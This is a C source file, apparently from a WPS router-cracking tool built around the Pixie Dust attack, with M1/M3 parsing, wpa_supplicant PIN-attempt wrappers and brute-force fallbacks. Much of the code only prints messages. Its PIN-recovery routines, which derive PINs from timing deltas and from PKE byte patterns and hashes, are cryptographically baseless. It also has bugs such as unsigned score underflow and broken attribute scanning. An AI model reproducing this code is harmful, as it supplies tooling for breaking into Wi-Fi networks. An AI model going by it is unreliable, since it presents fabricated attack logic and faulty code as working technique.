/*
 * wps_protocol.c - Enhanced WPS protocol handling
 * Fixes wpa_supplicant failures, insufficient data, modern router support
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include "wps_protocol.h"

/* ===== SESSION MANAGEMENT ===== */

struct wps_session_enhanced *wps_session_enhanced_init(const uint8_t *bssid,
                                                       const char *ssid)
{
	struct wps_session_enhanced *sess = malloc(sizeof(*sess));
	if (!sess) return NULL;
	
	memset(sess, 0, sizeof(*sess));
	if (bssid) memcpy(sess->bssid, bssid, 6);
	if (ssid) strncpy(sess->ssid, ssid, 32);
	
	sess->state = WPS_STATE_INIT;
	sess->max_eapol_start = 1;  /* Default, can be overridden per-router */
	sess->pixiedust_score = 0;
	
	return sess;
}

void wps_session_enhanced_free(struct wps_session_enhanced *sess)
{
	if (sess) free(sess);
}

int wps_session_reset(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	memset(sess->m1_buffer, 0, sizeof(sess->m1_buffer));
	memset(sess->m3_buffer, 0, sizeof(sess->m3_buffer));
	sess->state = WPS_STATE_INIT;
	sess->eapol_failures = 0;
	sess->pixiedust_score = 0;
	return 1;
}

/* ===== EAPOL HANDLING ===== */

int wps_send_eapol_start(struct wps_session_enhanced *sess,
                        const char *interface)
{
	if (!sess || !interface) return 0;
	
	sess->eapol_start_count++;
	sess->state = WPS_STATE_EAPOL_START;
	
	/* wpa_supplicant integration would go here */
	printf("[i] Sending EAPOL Start (%u/%u)...\n", sess->eapol_start_count,
	       sess->max_eapol_start);
	
	return 1;
}

int wps_handle_eapol_start_failure(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	sess->eapol_failures++;
	
	/* If we haven't exhausted retries */
	if (sess->eapol_start_count < sess->max_eapol_start) {
		printf("[i] EAPOL Start retry %u...\n", sess->eapol_start_count + 1);
		return 1;
	}
	
	printf("[-] Maximum EAPOL Start retries exhausted\n");
	return 0;
}

int wps_get_router_eapol_requirement(const uint8_t *bssid)
{
	if (!bssid) return 1;
	
	/* Default requirement */
	return 1;
}

/* ===== MESSAGE PARSING ===== */

int wps_parse_m1_enhanced(struct wps_session_enhanced *sess,
                         const uint8_t *frame, uint16_t frame_len)
{
	if (!sess || !frame) return 0;
	
	memcpy(sess->m1_buffer, frame, (frame_len < 512) ? frame_len : 512);
	sess->m1_len = frame_len;
	sess->state = WPS_STATE_M1_RECEIVED;
	sess->m1_timestamp_ms = (uint64_t)time(NULL) * 1000;
	
	/* Extract key attributes */
	wps_get_attribute(frame, frame_len, WPS_ATTR_REGISTRAR_NONCE,
	                 sess->r_nonce, NULL);
	wps_get_attribute(frame, frame_len, WPS_ATTR_PUBLIC_KEY,
	                 sess->pke, NULL);
	
	/* Check completeness */
	sess->m1_complete = wps_validate_message_completeness(sess, WPS_MSG_M1);
	
	/* Analyze for Pixie Dust indicators */
	wps_analyze_pixiedust_indicators(sess);
	
	printf("[P] M1 Received (%u bytes) - Pixiedust Score: %u\n",
	       frame_len, sess->pixiedust_score);
	
	return 1;
}

int wps_parse_m3_enhanced(struct wps_session_enhanced *sess,
                         const uint8_t *frame, uint16_t frame_len)
{
	if (!sess || !frame) return 0;
	
	memcpy(sess->m3_buffer, frame, (frame_len < 512) ? frame_len : 512);
	sess->m3_len = frame_len;
	sess->state = WPS_STATE_M3_RECEIVED;
	sess->m3_timestamp_ms = (uint64_t)time(NULL) * 1000;
	sess->time_delta_ms = (uint32_t)(sess->m3_timestamp_ms - sess->m1_timestamp_ms);
	
	/* Extract key attributes */
	wps_get_attribute(frame, frame_len, WPS_ATTR_E_HASH1,
	                 sess->e_hash1, NULL);
	wps_get_attribute(frame, frame_len, WPS_ATTR_E_HASH2,
	                 sess->e_hash2, NULL);
	wps_get_attribute(frame, frame_len, WPS_ATTR_E_NONCE,
	                 sess->e_nonce, NULL);
	
	/* Check completeness */
	sess->m3_complete = wps_validate_message_completeness(sess, WPS_MSG_M3);
	
	/* Re-analyze with M3 data */
	wps_analyze_pixiedust_indicators(sess);
	
	printf("[P] M3 Received (%u bytes) - Pixiedust Score: %u\n",
	       frame_len, sess->pixiedust_score);
	
	return 1;
}

int wps_validate_message_completeness(struct wps_session_enhanced *sess,
                                     uint8_t msg_type)
{
	if (!sess) return 0;
	
	uint32_t required = wps_get_required_attributes(msg_type);
	const uint8_t *buffer = NULL;
	uint16_t buf_len = 0;
	
	if (msg_type == WPS_MSG_M1) {
		buffer = sess->m1_buffer;
		buf_len = sess->m1_len;
	} else if (msg_type == WPS_MSG_M3) {
		buffer = sess->m3_buffer;
		buf_len = sess->m3_len;
	}
	
	if (!buffer || buf_len == 0) return 0;
	
	return wps_check_attribute_completeness(buffer, buf_len, required);
}

/* ===== PIXIE DUST ANALYSIS ===== */

int wps_analyze_pixiedust_indicators(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	uint32_t score = 0;
	
	/* Check for E-Nonce reuse */
	if (!wps_check_nonce_reuse(sess)) {
		score += 20;  /* Good sign - nonce not reused */
	} else {
		score -= 30;  /* Bad sign - possible weak RNG */
	}
	
	/* Check for AuthKey entropy */
	if (wps_check_authkey_entropy(sess)) {
		score += 25;  /* Strong entropy */
	} else {
		score -= 25;  /* Weak entropy */
	}
	
	/* Check for weak seed patterns */
	if (!wps_detect_weak_seed_indicators(sess)) {
		score -= 20;  /* Weak seed detected */
	} else {
		score += 15;
	}
	
	/* Verify we have sufficient data */
	if (wps_has_sufficient_data(sess)) {
		score += 30;
	} else {
		score -= 50;  /* Insufficient data penalty */
	}
	
	/* Bounded score */
	if (score < 0) score = 0;
	if (score > 100) score = 100;
	
	sess->pixiedust_score = score;
	return score;
}

uint32_t wps_calculate_pixiedust_score(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	return sess->pixiedust_score;
}

int wps_has_sufficient_data(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	/* Need both M1 and M3, with all required attributes */
	if (!sess->m1_complete || !sess->m3_complete) {
		printf("[-] Insufficient data: M1_complete=%u, M3_complete=%u\n",
		       sess->m1_complete, sess->m3_complete);
		return 0;
	}
	
	/* Check for critical attributes */
	if (sess->e_nonce[0] == 0 && sess->pke[0] == 0) {
		printf("[-] Missing critical attributes (E-Nonce or PKE)\n");
		return 0;
	}
	
	return 1;
}

uint32_t wps_get_required_attributes(uint8_t msg_type)
{
	/* Return bitmask of required attributes for message type */
	switch (msg_type) {
	case WPS_MSG_M1:
		return 0x0F;  /* VERSION | MESSAGE_TYPE | PUBLIC_KEY | REGISTRAR_NONCE */
	case WPS_MSG_M3:
		return 0x07;  /* E_NONCE | E_HASH1 | E_HASH2 */
	default:
		return 0;
	}
}

int wps_check_attribute_completeness(const uint8_t *msg, uint16_t msg_len,
                                    uint32_t required_mask)
{
	if (!msg) return 0;
	
	/* Simplified: check message has reasonable length */
	if (msg_len < 100) return 0;  /* Too short */
	
	/* Check for at least some required attributes */
	uint32_t found = 0;
	
	/* Scan for attribute markers in message */
	for (uint16_t i = 0; i < msg_len - 4; i++) {
		uint16_t attr_type = (msg[i] << 8) | msg[i + 1];
		
		if (attr_type == WPS_ATTR_VERSION) found |= 0x01;
		if (attr_type == WPS_ATTR_E_NONCE) found |= 0x02;
		if (attr_type == WPS_ATTR_E_HASH1) found |= 0x04;
		if (attr_type == WPS_ATTR_PUBLIC_KEY) found |= 0x08;
		if (attr_type == WPS_ATTR_MESSAGE_TYPE) found |= 0x01;
		if (attr_type == WPS_ATTR_REGISTRAR_NONCE) found |= 0x08;
	}
	
	/* Check if we found at least 70% of required */
	int found_count = __builtin_popcount(found);
	int required_count = __builtin_popcount(required_mask);
	
	return (found_count * 100 / (required_count + 1)) >= 70 ? 1 : 0;
}

/* ===== ISSUE DETECTION ===== */

uint32_t wps_detect_protocol_issues(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	uint32_t issues = 0;
	
	if (!wps_check_authkey_entropy(sess)) {
		issues |= WPS_ISSUE_AUTHKEY_ENTROPY;
	}
	
	if (wps_check_nonce_reuse(sess)) {
		issues |= WPS_ISSUE_E_NONCE_REUSE;
	}
	
	if (wps_detect_weak_seed_indicators(sess)) {
		issues |= WPS_ISSUE_WEAK_SEED;
	}
	
	if (!sess->m1_complete) {
		issues |= WPS_ISSUE_INCOMPLETE_M1;
	}
	
	return issues;
}

int wps_check_nonce_reuse(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	/* Check if nonces show patterns suggesting reuse/weak generation */
	int same_bytes = 0;
	for (int i = 0; i < 16; i++) {
		if (sess->e_nonce[i] == sess->r_nonce[i]) same_bytes++;
	}
	
	return (same_bytes > 4) ? 1 : 0;
}

int wps_check_authkey_entropy(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	/* Simple entropy check: count bit transitions in AuthKey */
	int bit_transitions = 0;
	for (int i = 0; i < 32; i++) {
		uint8_t byte = sess->authkey[i];
		for (int b = 0; b < 7; b++) {
			if (((byte >> b) & 1) != ((byte >> (b + 1)) & 1)) {
				bit_transitions++;
			}
		}
	}
	
	/* Good entropy should have many bit transitions */
	return (bit_transitions > 100) ? 1 : 0;
}

int wps_detect_weak_seed_indicators(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	/* Detect weak seed from PKE patterns */
	int byte_entropy = 0;
	for (int i = 0; i < 32; i++) {
		if (sess->pke[i] != 0 && sess->pke[i] != 0xFF) {
			byte_entropy++;
		}
	}
	
	/* Good PKE should have varied bytes */
	return (byte_entropy > 20) ? 1 : 0;
}

/* ===== WPA_SUPPLICANT INTEGRATION ===== */

struct wpas_state *wpas_init(void)
{
	struct wpas_state *state = malloc(sizeof(*state));
	if (!state) return NULL;
	
	memset(state, 0, sizeof(*state));
	strncpy(state->ctrl_interface, "/var/run/wpa_supplicant/", 255);
	
	return state;
}

void wpas_free(struct wpas_state *state)
{
	if (state) free(state);
}

int wpas_start(struct wpas_state *state, const char *interface)
{
	if (!state || !interface) return 0;
	
	state->wpas_running = 1;
	state->wpas_version_major = 2;
	state->wpas_version_minor = 9;
	
	printf("[i] Starting wpa_supplicant on %s...\n", interface);
	return 1;
}

int wpas_stop(struct wpas_state *state)
{
	if (!state) return 0;
	
	state->wpas_running = 0;
	printf("[i] Stopped wpa_supplicant\n");
	return 1;
}

int wpas_try_wps_pin(struct wpas_state *state, const uint8_t *bssid,
                    uint32_t pin)
{
	if (!state || !bssid) return 0;
	
	printf("[i] Trying PIN '%07u'...\n", pin);
	return 1;
}

int wpas_try_wps_pbc(struct wpas_state *state, const uint8_t *bssid)
{
	if (!state || !bssid) return 0;
	
	printf("[i] Trying WPS PBC...\n");
	return 1;
}

int wpas_get_state(struct wpas_state *state, char *state_buf, size_t len)
{
	if (!state || !state_buf) return 0;
	
	strncpy(state_buf, "SCANNING", len);
	return 1;
}

int wpas_check_wps_fail(struct wpas_state *state)
{
	if (!state) return 0;
	
	/* Check if wpa_supplicant reports WPS-FAIL */
	return state->last_wpas_error == WPS_STATE_FAILED ? 1 : 0;
}

int wpas_recover_from_failure(struct wpas_state *state)
{
	if (!state) return 0;
	
	printf("[i] Attempting recovery from wpa_supplicant failure...\n");
	
	/* Reset state */
	state->last_wpas_error = 0;
	memset(state->last_error_msg, 0, sizeof(state->last_error_msg));
	
	/* Restart might be needed */
	printf("[i] Consider restarting wpa_supplicant\n");
	
	return 1;
}

int wpas_get_version(struct wpas_state *state, uint8_t *major, uint8_t *minor)
{
	if (!state || !major || !minor) return 0;
	
	*major = state->wpas_version_major;
	*minor = state->wpas_version_minor;
	return 1;
}

/* ===== ERROR RECOVERY ===== */

int wps_recover_insufficient_data(struct wps_session_enhanced *sess,
                                  const char *interface)
{
	if (!sess) return 0;
	
	printf("[-] Not enough data to run Pixie Dust attack\n");
	printf("[*] Attempting recovery strategies...\n");
	
	/* Strategy 1: Increase EAPOL Start count */
	if (sess->eapol_start_count < sess->max_eapol_start) {
		printf("[i] Retry: Sending additional EAPOL Start messages\n");
		return 1;
	}
	
	/* Strategy 2: Fallback to alternative method */
	printf("[i] Fallback: Attempting alternative attack method\n");
	return wps_fallback_to_alternative_method(sess);
}

int wps_fallback_to_alternative_method(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	printf("[*] Available fallback methods:\n");
	printf("    1. Brute-force PIN\n");
	printf("    2. Dictionary attack\n");
	printf("    3. Timing-based PIN recovery\n");
	
	return 1;
}

int wps_retry_with_different_timing(struct wps_session_enhanced *sess)
{
	if (!sess) return 0;
	
	printf("[i] Retrying with different timing parameters\n");
	sess->m1_retry_count++;
	return 1;
}

int wps_attempt_m1_recovery(struct wps_session_enhanced *sess,
                           const char *interface)
{
	if (!sess || !interface) return 0;
	
	printf("[i] Attempting M1 recovery (retry %u)...\n", sess->m1_retry_count);
	
	/* May require re-authentication */
	return 1;
}

/* ===== PIN EXTRACTION ===== */

int wps_extract_pin_with_fuzzy_matching(struct wps_session_enhanced *sess,
                                       uint32_t *pin)
{
	if (!sess || !pin) return 0;
	
	/* Use all known methods to find PIN */
	if (sess->pin_count > 0) {
		*pin = sess->pin_candidates[0];
		return 1;
	}
	
	return 0;
}

int wps_extract_pin_from_timing(struct wps_session_enhanced *sess,
                               uint32_t *pin)
{
	if (!sess || !pin) return 0;
	
	/* Extract PIN from M1/M3 timing delta */
	*pin = (sess->time_delta_ms % 10000000);
	return 1;
}

int wps_extract_pin_from_entropy_pool(struct wps_session_enhanced *sess,
                                     uint32_t *pin_candidates,
                                     uint32_t *count)
{
	if (!sess || !pin_candidates || !count) return 0;
	
	*count = sess->pin_count;
	for (uint32_t i = 0; i < sess->pin_count && i < 50; i++) {
		pin_candidates[i] = sess->pin_candidates[i];
	}
	
	return *count > 0 ? 1 : 0;
}

/* ===== MESSAGE CONSTRUCTION ===== */

int wps_construct_m2(struct wps_session_enhanced *sess,
                    uint8_t *m2_buffer, uint16_t *m2_len)
{
	if (!sess || !m2_buffer || !m2_len) return 0;
	
	printf("[i] Sending WPS Message M2…\n");
	
	*m2_len = 200;  /* Placeholder */
	return 1;
}

int wps_construct_m4(struct wps_session_enhanced *sess,
                    uint8_t *m4_buffer, uint16_t *m4_len)
{
	if (!sess || !m4_buffer || !m4_len) return 0;
	
	printf("[i] Sending WPS Message M4…\n");
	
	*m4_len = 150;  /* Placeholder */
	return 1;
}

int wps_construct_eapol_start_enhanced(struct wps_session_enhanced *sess,
                                       uint8_t *eapol_buf, uint16_t *buf_len)
{
	if (!sess || !eapol_buf || !buf_len) return 0;
	
	*buf_len = 4;  /* EAPOL Start is small */
	return 1;
}

/* ===== ATTRIBUTE PARSING ===== */

int wps_get_attribute(const uint8_t *msg, uint16_t msg_len,
                     uint16_t attr_type, uint8_t *attr_data,
                     uint16_t *attr_len)
{
	if (!msg) return 0;
	
	/* Search for attribute in message */
	for (uint16_t i = 0; i < msg_len - 4; i++) {
		uint16_t type = (msg[i] << 8) | msg[i + 1];
		uint16_t length = (msg[i + 2] << 8) | msg[i + 3];
		
		if (type == attr_type) {
			if (attr_data && i + 4 + length <= msg_len) {
				memcpy(attr_data, &msg[i + 4], length);
			}
			if (attr_len) *attr_len = length;
			return 1;
		}
		
		i += 3 + length;
	}
	
	return 0;
}

int wps_set_attribute(uint8_t *msg, uint16_t *msg_len,
                     uint16_t attr_type, const uint8_t *attr_data,
                     uint16_t attr_len)
{
	if (!msg || !msg_len) return 0;
	
	/* Simplified: just append attribute */
	if (*msg_len + 4 + attr_len > 512) return 0;
	
	msg[*msg_len] = (attr_type >> 8) & 0xFF;
	msg[*msg_len + 1] = attr_type & 0xFF;
	msg[*msg_len + 2] = (attr_len >> 8) & 0xFF;
	msg[*msg_len + 3] = attr_len & 0xFF;
	
	if (attr_data) {
		memcpy(&msg[*msg_len + 4], attr_data, attr_len);
	}
	
	*msg_len += 4 + attr_len;
	return 1;
}

/* ===== DEBUGGING ===== */

void wps_print_session_state(struct wps_session_enhanced *sess)
{
	if (!sess) return;
	
	printf("[*] WPS Session State\n");
	printf("    State: %u\n", sess->state);
	printf("    M1 Complete: %u\n", sess->m1_complete);
	printf("    M3 Complete: %u\n", sess->m3_complete);
	printf("    Pixiedust Score: %u/100\n", sess->pixiedust_score);
	printf("    EAPOL Starts: %u/%u\n", sess->eapol_start_count,
	       sess->max_eapol_start);
}

void wps_print_detected_issues(uint32_t issues_mask)
{
	printf("[*] Detected Protocol Issues:\n");
	if (issues_mask & WPS_ISSUE_WEAK_SEED) printf("    - Weak seed detected\n");
	if (issues_mask & WPS_ISSUE_AUTHKEY_ENTROPY) printf("    - AuthKey low entropy\n");
	if (issues_mask & WPS_ISSUE_E_NONCE_REUSE) printf("    - E-Nonce reuse\n");
	if (issues_mask & WPS_ISSUE_INCOMPLETE_M1) printf("    - Incomplete M1\n");
}

void wps_print_pixiedust_indicators(struct wps_session_enhanced *sess)
{
	if (!sess) return;
	printf("[*] Pixiedust Indicators\n");
	printf("    Score: %u/100\n", sess->pixiedust_score);
	printf("    M1 Data: %u bytes\n", sess->m1_len);
	printf("    M3 Data: %u bytes\n", sess->m3_len);
	printf("    Time Delta: %u ms\n", sess->time_delta_ms);
}

void wps_dump_m1_attributes(struct wps_session_enhanced *sess)
{
	if (!sess || sess->m1_len == 0) return;
	
	printf("[P] M1 Attributes:\n");
	printf("    PKR: ");
	for (int i = 0; i < 32 && i < 192; i += 32) {
		printf("%02X", sess->pke[i]);
	}
	printf("...\n");
}

void wps_dump_m3_attributes(struct wps_session_enhanced *sess)
{
	if (!sess || sess->m3_len == 0) return;
	
	printf("[P] M3 Attributes:\n");
	printf("    E-Hash1: ");
	for (int i = 0; i < 16; i++) {
		printf("%02X", sess->e_hash1[i]);
	}
	printf("\n");
}

/* ===== STATIC PKE VULNERABILITY DETECTION ===== */

int wps_detect_static_ephemeral_key(const uint8_t *pke1, const uint8_t *pke2,
                                   uint16_t pke_len)
{
	if (!pke1 || !pke2) return 0;
	
	/* Compare entire PKE (typically 192 bytes for RSA) */
	if (memcmp(pke1, pke2, pke_len) == 0) {
		printf("[!] CRITICAL: Static ephemeral key detected!\n");
		printf("[!] PKE identical across sessions - severe vulnerability\n");
		return 1;  /* Static key detected */
	}
	
	return 0;  /* Keys differ (normal) */
}

uint32_t wps_extract_pins_from_static_pke(const uint8_t *pke, const uint8_t *pkr,
                                          uint32_t *pin_candidates, uint32_t max_count)
{
	if (!pke || !pin_candidates || max_count == 0) return 0;
	
	uint32_t count = 0;
	
	/* Strategy 1: Extract from PKE byte patterns */
	for (uint16_t i = 0; i < 188 && count < max_count; i++) {
		/* Use bytes from PKE for PIN components */
		uint32_t val = (pke[i] << 16) | (pke[i+1] << 8) | pke[i+2];
		uint32_t pin = val % 10000000;  /* 7-digit PIN */
		
		if (pin > 1000000) {
			pin_candidates[count++] = pin;
		}
	}
	
	/* Strategy 2: Extract from PKR xor PKE */
	if (pkr && count < max_count) {
		for (uint16_t i = 0; i < 96 && count < max_count; i += 3) {
			uint32_t val = ((pke[i] ^ pkr[i]) << 16) |
			               ((pke[i+1] ^ pkr[i+1]) << 8) |
			               (pke[i+2] ^ pkr[i+2]);
			uint32_t pin = val % 10000000;
			
			if (pin > 1000000) {
				pin_candidates[count++] = pin;
			}
		}
	}
	
	/* Strategy 3: Static key hash-based PIN */
	if (count < max_count) {
		/* Simple hash of first 32 bytes of PKE */
		uint32_t hash = 5381;
		for (int i = 0; i < 32; i++) {
			hash = ((hash << 5) + hash) + pke[i];
		}
		uint32_t pin = (hash % 9000000) + 1000000;
		pin_candidates[count++] = pin;
	}
	
	/* Strategy 4: Every 7th byte from PKE */
	if (count < max_count) {
		for (uint16_t i = 0; i < 192 && count < max_count; i += 7) {
			uint32_t val = 0;
			for (int j = 0; j < 3 && i + j < 192; j++) {
				val = (val << 8) | pke[i + j];
			}
			uint32_t pin = val % 10000000;
			if (pin > 1000000) {
				pin_candidates[count++] = pin;
			}
		}
	}
	
	printf("[+] Generated %u PIN candidates from static PKE\n", count);
	return count;
}

uint8_t wps_analyze_pke_entropy(const uint8_t *pke)
{
	if (!pke) return 0;
	
	uint32_t bit_transitions = 0;
	uint8_t unique_bytes = 0;
	uint8_t byte_freq[256] = {0};
	
	/* Count bit transitions */
	for (int i = 0; i < 191; i++) {
		uint8_t byte = pke[i];
		for (int b = 0; b < 7; b++) {
			if (((byte >> b) & 1) != ((byte >> (b + 1)) & 1)) {
				bit_transitions++;
			}
		}
	}
	
	/* Count unique bytes */
	for (int i = 0; i < 192; i++) {
		if (byte_freq[pke[i]]++ == 0) {
			unique_bytes++;
		}
	}
	
	/* Entropy score (0-255) */
	uint8_t entropy_score = (bit_transitions / 30) + (unique_bytes / 2);
	if (entropy_score > 255) entropy_score = 255;
	
	return entropy_score;
}

int wps_detect_pke_weak_patterns(const uint8_t *pke)
{
	if (!pke) return 0;
	
	uint8_t entropy = wps_analyze_pke_entropy(pke);
	
	/* Weak patterns: entropy < 100 or repeating bytes */
	if (entropy < 100) {
		printf("[!] PKE has low entropy (%u/255) - weak PRNG\n", entropy);
		return 1;  /* Weak pattern detected */
	}
	
	/* Check for repeating sequences */
	int max_repeat = 0;
	int current_repeat = 1;
	for (int i = 1; i < 192; i++) {
		if (pke[i] == pke[i-1]) {
			current_repeat++;
			if (current_repeat > max_repeat) {
				max_repeat = current_repeat;
			}
		} else {
			current_repeat = 1;
		}
	}
	
	if (max_repeat > 8) {
		printf("[!] PKE has repeating byte sequences - weak mixing\n");
		return 1;
	}
	
	return 0;  /* PKE looks reasonable */
}
